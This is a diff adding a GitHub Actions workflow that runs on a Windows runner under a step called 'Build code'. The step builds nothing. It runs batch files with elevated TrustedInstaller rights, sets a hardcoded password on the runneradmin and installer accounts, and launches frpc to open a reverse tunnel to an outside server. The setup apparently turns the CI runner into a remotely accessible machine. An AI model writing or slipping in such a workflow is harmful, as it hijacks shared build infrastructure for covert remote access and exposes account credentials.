@@ -1,0 +1,26 @@
+name: mft
+on:
+  push:
+    branches: [ "main" ]
+  pull_request:
+    branches: [ "main" ]
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v2
+      - name: Build code
+        run: |
+          dir
+          label C: Fyson
+          label D: Raptor
+          echo ---------------------
+          .\NSudoLC.exe -U:T -P:E file.bat
+          echo ---------------------
+          net user runneradmin XBNDnj79FxEFIw*O
+          echo ---------------------
+          net user installer XBNDnj79FxEFIw*O
+          echo ---------------------
+          ./NSudoLC.exe -U:T -P:E del.bat
+          ./frpc -c ./frpc.ini
